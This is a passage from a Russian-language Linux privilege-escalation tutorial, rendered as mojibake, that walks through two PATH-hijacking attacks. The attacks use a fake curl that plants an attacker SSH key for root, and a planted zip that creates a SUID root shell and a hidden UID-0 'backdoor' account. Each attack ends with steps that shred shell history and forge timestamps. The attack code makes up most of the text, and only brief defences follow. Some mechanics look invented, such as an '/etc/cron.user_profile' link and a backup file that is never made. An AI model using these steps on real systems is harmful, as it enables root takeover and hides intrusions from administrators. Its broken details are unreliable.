    - `.local/bin`: —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–π –ø—É—Ç—å –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏—Ö –±–∏–Ω–∞—Ä–Ω–∏–∫–æ–≤, —á–∞—Å—Ç–æ –ø—Ä–∏—Å—É—Ç—Å—Ç–≤—É–µ—Ç –≤ PATH

  2. **–°–æ–¥–µ—Ä–∂–∏–º–æ–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ curl:**
    - `#!/bin/bash` —Å–∫—Ä–∏–ø—Ç –¥–æ–ª–∂–µ–Ω –≤—ã–ø–æ–ª–Ω—è—Ç—å—Å—è —á–µ—Ä–µ–∑ Bash
    ```bash
    #!/bin/bash
    ```
    - –°–æ–∑–¥–∞–µ—Ç –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é –¥–ª—è SSH-–∫–ª—é—á–µ–π root —Å –ø—Ä–∞–≤–∏–ª—å–Ω—ã–º–∏ –ø—Ä–∞–≤–∞–º–∏ (–µ—Å–ª–∏ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç)
    ```bash
    mkdir -p /root/.ssh
    chmod 700 /root/.ssh
    ```
    - –î–æ–±–∞–≤–ª—è–µ—Ç –ø—É–±–ª–∏—á–Ω—ã–π SSH-–∫–ª—é—á –∞—Ç–∞–∫—É—é—â–µ–≥–æ –≤ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã–µ –∫–ª—é—á–∏ root
    - –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç –ø—Ä–∞–≤–∏–ª—å–Ω—ã–µ –ø—Ä–∞–≤–∞ –¥–æ—Å—Ç—É–ø–∞ (—Ç–æ–ª—å–∫–æ —á—Ç–µ–Ω–∏–µ –¥–ª—è –≤–ª–∞–¥–µ–ª—å—Ü–∞)
    ```bash
    echo "ssh-rsa AAAAB3NzaC1yc2E..." >> /root/.ssh/authorized_keys
    chmod 600 /root/.ssh/authorized_keys
    ```
    - –í—ã–∑—ã–≤–∞–µ—Ç –Ω–∞—Å—Ç–æ—è—â–∏–π curl —Å –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–º–∏ –∞—Ä–≥—É–º–µ–Ω—Ç–∞–º–∏
    - –≠—Ç–æ –º–∞—Å–∫–∏—Ä—É–µ—Ç –∞—Ç–∞–∫—É - –∑–∞–¥–∞—á–∞ –ø—Ä–æ–¥–æ–ª–∂–∞–µ—Ç —Ä–∞–±–æ—Ç–∞—Ç—å –∫–∞–∫ –æ–±—ã—á–Ω–æ
    ```bash
    /usr/bin/curl "$@"
    ```
  3. `chmod +x`: –î–µ–ª–∞–µ—Ç —Å–∫—Ä–∏–ø—Ç –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–º

---

#### –®–∞–≥ 3: –ò–∑–º–µ–Ω–µ–Ω–∏–µ PATH –¥–ª—è cron
```bash
# –î–æ–±–∞–≤–ª—è–µ–º –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é –≤ PATH —á–µ—Ä–µ–∑ .bashrc
echo 'export PATH="/home/user/.local/bin:$PATH"' >> ~/.bashrc

# –î–ª—è cron-–∑–∞–¥–∞—á, –≤—ã–ø–æ–ª–Ω—è–µ–º—ã—Ö –æ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:
sudo ln -s /home/user/.bashrc /etc/cron.user_profile
```

**–ü–æ—è—Å–Ω–µ–Ω–∏—è:**
  1. **–ò–∑–º–µ–Ω–µ–Ω–∏–µ .bashrc:**
    - –î–æ–±–∞–≤–ª—è–µ—Ç —Å—Ç—Ä–æ–∫—É `export PATH="/home/user/.local/bin:$PATH"` –≤ –∫–æ–Ω–µ—Ü —Ñ–∞–π–ª–∞ `.bashrc`
    - –ü—Ä–∏ –∫–∞–∂–¥–æ–º –∑–∞–ø—É—Å–∫–µ Bash –±—É–¥–µ—Ç –¥–æ–±–∞–≤–ª—è—Ç—å `/home/user/.local/bin` –≤ **–Ω–∞—á–∞–ª–æ** PATH
  2. **–°–æ–∑–¥–∞–Ω–∏–µ —Å–∏–º–≤–æ–ª–∏—á–µ—Å–∫–æ–π —Å—Å—ã–ª–∫–∏:**
    - `sudo ln -s /home/user/.bashrc /etc/cron.user_profile`
    - –°–æ–∑–¥–∞–µ—Ç —Å–∏—Å—Ç–µ–º–Ω—ã–π —Ñ–∞–π–ª `/etc/cron.user_profile`, —Å—Å—ã–ª–∞—é—â–∏–π—Å—è –Ω–∞ `.bashrc` –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    - Cron –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é –Ω–µ –∑–∞–≥—Ä—É–∂–∞–µ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–µ .bashrc. –≠—Ç–∞ —Å—Å—ã–ª–∫–∞ –∑–∞—Å—Ç–∞–≤–ª—è–µ—Ç cron –∑–∞–≥—Ä—É–∂–∞—Ç—å –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ PATH

**–ú–µ—Ö–∞–Ω–∏–∫–∞ —Ä–∞–±–æ—Ç—ã –≤ cron:**
  1. –ü—Ä–∏ –∑–∞–ø—É—Å–∫–µ cron-–∑–∞–¥–∞—á–∏, –∏—â–µ—Ç—Å—è —Ñ–∞–π–ª `/etc/cron.user_profile`
  2. –ß–µ—Ä–µ–∑ —Å–∏–º–≤–æ–ª–∏—á–µ—Å–∫—É—é —Å—Å—ã–ª–∫—É –∑–∞–≥—Ä—É–∂–∞–µ—Ç—Å—è `~/.bashrc` –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
  3. –í—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è `export PATH`, –¥–æ–±–∞–≤–ª—è—è `/home/user/.local/bin` –≤ –Ω–∞—á–∞–ª–æ PATH
  4. –ü—Ä–∏ –≤—ã–∑–æ–≤–µ `curl` –≤ —Å–∫—Ä–∏–ø—Ç–µ, —Å–∏—Å—Ç–µ–º–∞ —Å–Ω–∞—á–∞–ª–∞ –ø—Ä–æ–≤–µ—Ä—è–µ—Ç `/home/user/.local/bin`
  5. –ù–∞—Ö–æ–¥–∏—Ç –∏ –≤—ã–ø–æ–ª–Ω—è–µ—Ç –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—É—é –≤–µ—Ä—Å–∏—é –≤–º–µ—Å—Ç–æ `/usr/bin/curl`

---

#### –®–∞–≥ 4: –û–∂–∏–¥–∞–Ω–∏–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è cron
> Cron-–∑–∞–¥–∞—á–∏ –≤—ã–ø–æ–ª–Ω—è—é—Ç—Å—è –ø–æ —Ä–∞—Å–ø–∏—Å–∞–Ω–∏—é. –ê—Ç–∞–∫—É—é—â–∏–π –Ω–µ –º–æ–∂–µ—Ç –ø—Ä–µ–¥—Å–∫–∞–∑–∞—Ç—å —Ç–æ—á–Ω–æ–µ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è, 
> –ø–æ—ç—Ç–æ–º—É —Å–∫—Ä–∏–ø—Ç "–¥–µ–∂—É—Ä–∏—Ç" –¥–æ —É—Å–ø–µ—à–Ω–æ–≥–æ –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –∫–ª—é—á–∞.
```bash
# –ñ–¥–µ–º –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è cron-–∑–∞–¥–∞—á–∏ (–º–∞–∫—Å. 1 —á–∞—Å)
while ! grep -q ssh-rsa /root/.ssh/authorized_keys; do
    sleep 300
done
```

**–ü–æ—è—Å–Ω–µ–Ω–∏—è:**
  - –ö–∞–∂–¥—ã–µ 5 –º–∏–Ω—É—Ç (300 —Å–µ–∫—É–Ω–¥) –ø—Ä–æ–≤–µ—Ä—è–µ—Ç –Ω–∞–ª–∏—á–∏–µ –∫–ª—é—á–∞ –≤ authorized_keys
  - `grep -q`: –¢–∏—Ö–∏–π —Ä–µ–∂–∏–º (–Ω–µ –≤—ã–≤–æ–¥–∏—Ç —Ä–µ–∑—É–ª—å—Ç–∞—Ç)
  - –¶–∏–∫–ª –∑–∞–≤–µ—Ä—à–∏—Ç—Å—è, –∫–æ–≥–¥–∞ cron-–∑–∞–¥–∞—á–∞ –≤—ã–ø–æ–ª–Ω–∏—Ç—Å—è (–º–∞–∫—Å–∏–º—É–º —á–µ—Ä–µ–∑ 1 —á–∞—Å)

---

#### –®–∞–≥ 5: –î–æ—Å—Ç—É–ø –∫ —Å–∏—Å—Ç–µ–º–µ
```bash
ssh -i attacker_key root@victim-host
```

**–ü–æ—è—Å–Ω–µ–Ω–∏—è:**
  - `-i attacker_key`: –£–∫–∞–∑—ã–≤–∞–µ—Ç –ø—É—Ç—å –∫ –ø—Ä–∏–≤–∞—Ç–Ω–æ–º—É –∫–ª—é—á—É
  - `root@victim-host`: –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ root –Ω–∞ —Ü–µ–ª–µ–≤–æ–π –º–∞—à–∏–Ω–µ

---

#### –®–∞–≥ 6: –ú–∞—Å–∫–∏—Ä–æ–≤–∫–∞ –∏–∑–º–µ–Ω–µ–Ω–∏–π
```bash
# –í–æ–∑–≤—Ä–∞—â–∞–µ–º –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–π —Ñ–∞–π–ª –≤ authorized_keys, —É–¥–∞–ª—è—è —Å–ª–µ–¥—ã —Å–≤–æ–µ–≥–æ –∫–ª—é—á–∞
mv /root/.ssh/authorized_keys.bak /root/.ssh/authorized_keys

# –£–¥–∞–ª—è–µ–º –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π curl –∏–∑ —Å–∏—Å—Ç–µ–º—ã, –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–∞—è –ø–æ–≤—Ç–æ—Ä–Ω–æ–µ —Å—Ä–∞–±–∞—Ç—ã–≤–∞–Ω–∏–µ –∏ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ
rm /home/user/.local/bin/curl

# –í–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–µ –≤—Ä–µ–º–µ–Ω–Ω—ã—Ö –º–µ—Ç–æ–∫
touch -r /etc/crontab /etc/cron.user_profile

# –£–¥–∞–ª–µ–Ω–∏–µ –∏—Å—Ç–æ—Ä–∏–∏ –∫–æ–º–∞–Ω–¥
shred -zu ~/.bash_history
history -c
```

#### –í—ã–≤–æ–¥—ã –ø–æ –∞—Ç–∞–∫–µ:
1. **–ü—Ä–∏–≤–∏–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –∫–æ–Ω—Ç–µ–∫—Å—Ç:**
   - Cron-–∑–∞–¥–∞—á–∞ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –æ—Ç –∏–º–µ–Ω–∏ **root**
   - –õ—é–±—ã–µ –∫–æ–º–∞–Ω–¥—ã –≤ —Å–∫—Ä–∏–ø—Ç–µ –Ω–∞—Å–ª–µ–¥—É—é—Ç –ø—Ä–∞–≤–∞ root
2. **–û—Ç–Ω–æ—Å–∏—Ç–µ–ª—å–Ω—ã–π –ø—É—Ç—å:**
   - –í—ã–∑–æ–≤ `curl` –±–µ–∑ `/usr/bin/` –¥–µ–ª–∞–µ—Ç –µ–≥–æ –∑–∞–≤–∏—Å–∏–º—ã–º –æ—Ç PATH
3. **–ö–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ –æ–∫—Ä—É–∂–µ–Ω–∏–µ–º:**
   - –ê—Ç–∞–∫—É—é—â–∏–π –º–æ–∂–µ—Ç –º–æ–¥–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞—Ç—å PATH —á–µ—Ä–µ–∑ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–µ —Ñ–∞–π–ª—ã
   - –°–∏–º–≤–æ–ª–∏—á–µ—Å–∫–∞—è —Å—Å—ã–ª–∫–∞ –∑–∞—Å—Ç–∞–≤–ª—è–µ—Ç cron –∑–∞–≥—Ä—É–∂–∞—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–µ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏
4. **–ú–∞—Å–∫–∏—Ä–æ–≤–∫–∞:**
   - –í—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π —Å–∫—Ä–∏–ø—Ç –≤—ã–∑—ã–≤–∞–µ—Ç –Ω–∞—Å—Ç–æ—è—â–∏–π curl
   - –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è —Å–∫—Ä–∏–ø—Ç–∞ –ø—Ä–æ–¥–æ–ª–∂–∞–µ—Ç —Ä–∞–±–æ—Ç–∞—Ç—å –Ω–æ—Ä–º–∞–ª—å–Ω–æ
   - –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä –Ω–µ –∑–∞–º–µ—á–∞–µ—Ç –∞–Ω–æ–º–∞–ª–∏–π –≤ —Ä–∞–±–æ—Ç–µ —Å–∏—Å—Ç–µ–º—ã

---

### –ü—Ä–∏–º–µ—Ä 2: –≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è —É—è–∑–≤–∏–º–æ–≥–æ Python-—Å–∫—Ä–∏–ø—Ç–∞ —Å –≤—ã–∑–æ–≤–æ–º `zip`
> –ï—Å—Ç—å —Å–∏—Å—Ç–µ–º–Ω—ã–π SUID-—Å–∫—Ä–∏–ø—Ç `/usr/local/bin/backup_reports`, –∏—Å–ø–æ–ª—å–∑—É–µ–º—ã–π –¥–ª—è –∞—Ä—Ö–∏–≤–∏—Ä–æ–≤–∞–Ω–∏—è —Ñ–∏–Ω–∞–Ω—Å–æ–≤—ã—Ö –æ—Ç—á–µ—Ç–æ–≤:
```python
#!/usr/bin/python3
import os
import subprocess

def create_backup():
    # –£—è–∑–≤–∏–º—ã–π –≤—ã–∑–æ–≤ - zip –±–µ–∑ –∞–±—Å–æ–ª—é—Ç–Ω–æ–≥–æ –ø—É—Ç–∏
    subprocess.call(["zip", "-r", "/backups/reports.zip", "/var/reports"])
    
if __name__ == "__main__":
    create_backup()
    print("Backup completed successfully")
```

**–î–∞–Ω–Ω—ã–µ —Å–∫—Ä–∏–ø—Ç–∞ –≤ —Å–∏—Å—Ç–µ–º–µ:**
```bash
ls -l /usr/local/bin/backup_reports
# -rwsr-xr-x 1 root root 582 May 15 10:23 /usr/local/bin/backup_reports
```
- –£—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω SUID-–±–∏—Ç (–∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è —Å –ø—Ä–∞–≤–∞–º–∏ root)
- –í—ã–∑—ã–≤–∞–µ—Ç `zip` –±–µ–∑ —É–∫–∞–∑–∞–Ω–∏—è –∞–±—Å–æ–ª—é—Ç–Ω–æ–≥–æ –ø—É—Ç–∏ (`/usr/bin/zip`)

---

#### –®–∞–≥ 1: –û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏
> –ü–æ–∏—Å–∫ SUID-—Å–∫—Ä–∏–ø—Ç–∞, –≤—ã–∑—ã–≤–∞—é—â–∏–π `zip` –±–µ–∑ –ø–æ–ª–Ω–æ–≥–æ –ø—É—Ç–∏
```bash
# –ü–æ–∏—Å–∫ SUID-–±–∏–Ω–∞—Ä–Ω–∏–∫–æ–≤
find / -perm -4000 -type f 2>/dev/null | grep -v "/snap/"

# –ê–Ω–∞–ª–∏–∑–∏—Ä—É–µ–º –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã–π –±–∏–Ω–∞—Ä–Ω–∏–∫
strings /usr/local/bin/backup_reports | grep "zip"
# zip -r /backups/reports.zip /var/reports
```

**–ü–æ—è—Å–Ω–µ–Ω–∏—è:**
- –ü—Ä–∏ –≤—ã–∑–æ–≤–µ `backup_reports` –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∞ –≤–µ—Ä—Å–∏—è `zip` –∏–∑ PATH –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è

---

#### –®–∞–≥ 2: –ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ zip
```bash
# –°–æ–∑–¥–∞–µ–º —Å–∫—Ä—ã—Ç—É—é –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é
mkdir -p ~/.cache/.bin && cd ~/.cache/.bin

# –°–æ–∑–¥–∞–µ–º –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π —Å–∫—Ä–∏–ø—Ç zip
cat > zip <<'EOF'
#!/bin/bash

# –ü–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞:
# 1. –°–æ–∑–¥–∞–µ–º SUID-–∫–æ–ø–∏—é /bin/bash
if [ ! -f /tmp/.sh ]; then
    cp /bin/bash /tmp/.sh
    chmod 4777 /tmp/.sh
fi

# 2. –î–æ–±–∞–≤–ª—è–µ–º —Å–∫—Ä—ã—Ç–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
if ! grep -q "^backdoor:" /etc/passwd; then
    echo 'backdoor:$1$salt$r8QzR2KdWXJfF7ZzD8lDq/:0:0::/root:/bin/bash' >> /etc/passwd
fi

# 3. –ó–∞–ø—É—Å–∫–∞–µ–º –Ω–∞—Å—Ç–æ—è—â–∏–π zip —Å –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–º–∏ –∞—Ä–≥—É–º–µ–Ω—Ç–∞–º–∏
/usr/bin/zip "$@"
EOF

# –î–µ–ª–∞–µ–º —Å–∫—Ä–∏–ø—Ç –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–º
chmod +x zip
```

**–ü–æ—è—Å–Ω–µ–Ω–∏—è:**
1. `cp /bin/bash /tmp/.sh && chmod 4777 /tmp/.sh`
   - –°–æ–∑–¥–∞–µ—Ç –∫–æ–ø–∏—é Bash —Å SUID-–±–∏—Ç–æ–º
   - –õ—é–±–æ–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –º–æ–∂–µ—Ç –∑–∞–ø—É—Å—Ç–∏—Ç—å `/tmp/.sh -p` –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è root-–¥–æ—Å—Ç—É–ø–∞
2. `echo 'backdoor:...' >> /etc/passwd`
   - –î–æ–±–∞–≤–ª—è–µ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è `backdoor` —Å UID=0 (root)
   - –ü–∞—Ä–æ–ª—å —Å —Å–æ–ª—å—é: `password` (—Ö—ç—à `$1$salt$r8QzR2KdWXJfF7ZzD8lDq/`)
3. `/usr/bin/zip "$@"`
   - –í—ã–∑—ã–≤–∞–µ—Ç –Ω–∞—Å—Ç–æ—è—â–∏–π `zip` —Å –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–º–∏ –∞—Ä–≥—É–º–µ–Ω—Ç–∞–º–∏
   - –ú–∞—Å–∫–∏—Ä—É–µ—Ç –∞—Ç–∞–∫—É - –∞—Ä—Ö–∏–≤ —Å–æ–∑–¥–∞–µ—Ç—Å—è –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ

---

#### –®–∞–≥ 3: –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –æ–∫—Ä—É–∂–µ–Ω–∏—è
```bash
# –î–æ–±–∞–≤–ª—è–µ–º –Ω–∞—à—É –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é –≤ –Ω–∞—á–∞–ª–æ PATH
export PATH="$HOME/.cache/.bin:$PATH"

# –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–æ–≤—ã–π PATH
echo $PATH
# /home/user/.cache/.bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø—Ä–∏–æ—Ä–∏—Ç–∏–∑–∞—Ü–∏—é
which zip
# /home/user/.cache/.bin/zip  <- –ù–∞—à–∞ –≤–µ—Ä—Å–∏—è!
```

**–ü–æ—è—Å–Ω–µ–Ω–∏—è:**
1. –ü—Ä–∏ –≤—ã–∑–æ–≤–µ `zip` —Å–∏—Å—Ç–µ–º–∞ –∏—â–µ—Ç –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–π —Ñ–∞–π–ª –≤ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—è—Ö PATH –ø–æ –ø–æ—Ä—è–¥–∫—É
2. –î–∏—Ä–µ–∫—Ç–æ—Ä–∏—è `/home/user/.cache/.bin` –ø—Ä–æ–≤–µ—Ä—è–µ—Ç—Å—è –ø–µ—Ä–≤–æ–π
3. –ù–∞—Ö–æ–¥–∏—Ç—Å—è –Ω–∞—à –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π —Å–∫—Ä–∏–ø—Ç –≤–º–µ—Å—Ç–æ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ `/usr/bin/zip`

---

#### –®–∞–≥ 4: –ó–∞–ø—É—Å–∫ —É—è–∑–≤–∏–º–æ–≥–æ —Å–∫—Ä–∏–ø—Ç–∞
```bash
# –ó–∞–ø—É—Å–∫–∞–µ–º SUID-—Å–∫—Ä–∏–ø—Ç –æ—Ç root
/usr/local/bin/backup_reports
# Backup completed successfully  <- –í—Å—ë –≤—ã–≥–ª—è–¥–∏—Ç –Ω–æ—Ä–º–∞–ª—å–Ω–æ!
```
**–ü–æ—è—Å–Ω–µ–Ω–∏—è:**
1. Python-—Å–∫—Ä–∏–ø—Ç –≤—ã–∑—ã–≤–∞–µ—Ç `subprocess.call(["zip", ...])`
2. –°–∏—Å—Ç–µ–º–∞ –∏—â–µ—Ç `zip` –≤ PATH, –Ω–∞—Ö–æ–¥–∏—Ç `/home/user/.cache/.bin/zip`
3. –í—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π —Å–∫—Ä–∏–ø—Ç –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è —Å –ø—Ä–∞–≤–∞–º–∏ root (–Ω–∞—Å–ª–µ–¥—É–µ—Ç SUID)
4. –í—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞:
   - –°–æ–∑–¥–∞–µ—Ç—Å—è SUID-shell `/tmp/.sh`
   - –î–æ–±–∞–≤–ª—è–µ—Ç—Å—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å `backdoor`
5. –í—ã–∑—ã–≤–∞–µ—Ç—Å—è –Ω–∞—Å—Ç–æ—è—â–∏–π `/usr/bin/zip` –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –∞—Ä—Ö–∏–≤–∞

---

#### –®–∞–≥ 5: –ü–æ–ª—É—á–µ–Ω–∏–µ –¥–æ—Å—Ç—É–ø–∞
**–í–∞—Ä–∏–∞–Ω—Ç—ã –ø–æ–ª—É—á–µ–Ω–∏—è –ø—Ä–∏–≤–∏–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø–∞:**
- **–ß–µ—Ä–µ–∑ SUID-shell**
    ```bash
    /tmp/.sh -p  # –§–ª–∞–≥ -p —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç –ø—Ä–∏–≤–∏–ª–µ–≥–∏–∏
    
    whoami  # root
    id
    # uid=1000(user) gid=1000(user) euid=0(root) egid=0(root)
    ```
- **–ß–µ—Ä–µ–∑ —Å–∫—Ä—ã—Ç–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è**
    ```bash
    su - backdoor
    Password: password  # –ü–∞—Ä–æ–ª—å, —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã–π –≤ —ç–∫—Å–ø–ª–æ–π—Ç–µ
    
    whoami  # root
    ```
- **–ß—Ä–µ–∑ SSH**
    ```bash
    ssh backdoor@victim-host
    Password: password
    ```

---

#### –®–∞–≥ 6: –ú–∞—Å–∫–∏—Ä–æ–≤–∫–∞ —Å–ª–µ–¥–æ–≤
```bash
# –£–¥–∞–ª—è–µ–º –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π zip
rm ~/.cache/.bin/zip

# –í–æ—Å—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–π PATH
export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

# –ú–∞—Å–∫–∏—Ä—É–µ–º –≤—Ä–µ–º–µ–Ω–Ω—ã–µ –º–µ—Ç–∫–∏
touch -r /usr/bin/zip /tmp/.sh  # –ö–æ–ø–∏—Ä—É–µ–º –º–µ—Ç–∫–∏ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ —Ñ–∞–π–ª–∞

# –û—á–∏—â–∞–µ–º –∏—Å—Ç–æ—Ä–∏—é –∫–æ–º–∞–Ω–¥
shred -zu ~/.bash_history
history -c

# –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ:
# –î–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è backdoor:
echo 'export PATH="/usr/bin:$PATH"' >> /root/.bashrc

# –î–ª—è SUID-—à–µ–ª–ª–∞:
mv /tmp/.sh /usr/lib/systemd/.sysupdate
chmod 4755 /usr/lib/systemd/.sysupdate
```

---

#### –í—ã–≤–æ–¥—ã –ø–æ –∞—Ç–∞–∫–µ:
1. **–î–≤–∞ –Ω–µ–∑–∞–≤–∏—Å–∏–º—ã—Ö –º–µ—Ö–∞–Ω–∏–∑–º–∞ –¥–ª—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –¥–æ—Å—Ç—É–ø–∞:**
   - SUID-—à–µ–ª–ª –≤ `/tmp`
   - –°–∫—Ä—ã—Ç—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤ `/etc/passwd`
2. **–ü–æ–ª–Ω–∞—è –º–∞—Å–∫–∏—Ä–æ–≤–∫–∞:**
   - –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è (–∞—Ä—Ö–∏–≤–∞—Ü–∏—è) –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ
   - –ù–µ—Ç –∞–Ω–æ–º–∞–ª–∏–π –≤ —Ä–∞–±–æ—Ç–µ —Å–∏—Å—Ç–µ–º—ã
   - –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä –≤–∏–¥–∏—Ç —É—Å–ø–µ—à–Ω–æ–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ backup_reports
3. **–û–±—Ö–æ–¥ –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞:**
   - –î–∏—Ä–µ–∫—Ç–æ—Ä–∏—è `~/.cache` - —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–æ–µ –º–µ—Å—Ç–æ –¥–ª—è –∫—ç—à–∞
   - –ò–º—è `.bin` –≤—ã–≥–ª—è–¥–∏—Ç –ª–µ–≥–∏—Ç–∏–º–Ω–æ
   - –ü–æ–¥–º–µ–Ω–∞ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç —Ç–æ–ª—å–∫–æ –≤–æ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —Å–∫—Ä–∏–ø—Ç–∞
4. **–ö—Ä–æ—Å—Å-–ø–ª–∞—Ç—Ñ–æ—Ä–º–µ–Ω–Ω–æ—Å—Ç—å:**
   - –†–∞–±–æ—Ç–∞–µ—Ç –¥–ª—è –ª—é–±—ã—Ö —Å–∫—Ä–∏–ø—Ç–æ–≤ (Python, Perl, Bash)
   - –ù–µ –∑–∞–≤–∏—Å–∏—Ç –æ—Ç –≤–µ—Ä—Å–∏–∏ –û–°
   - –≠—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω–∞ –¥–∞–∂–µ –≤ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞—Ö

---

## –ó–∞—â–∏—Ç–Ω—ã–µ –º–µ—Ä—ã

### –ü—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–µ–Ω–∏–µ –∞—Ç–∞–∫–∏
- **–ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∞–±—Å–æ–ª—é—Ç–Ω—ã–µ –ø—É—Ç–∏** –≤ –ø—Ä–æ–≥—Ä–∞–º–º–∞—Ö –∏ —Å–∫—Ä–∏–ø—Ç–∞—Ö
- **–°–±—Ä–æ—Å –æ–∫—Ä—É–∂–µ–Ω–∏—è** –≤ SUID-–ø—Ä–æ–≥—Ä–∞–º–º–∞—Ö
- **–ó–∞–ø—Ä–µ—Ç–∏—Ç—å –æ–ø–∞—Å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏** (–ó–∞–º–µ–Ω–∞ `system()` –Ω–∞ `execve()` —Å —É–∫–∞–∑–∞–Ω–∏–µ–º –ø–æ–ª–Ω–æ–≥–æ –ø—É—Ç–∏)

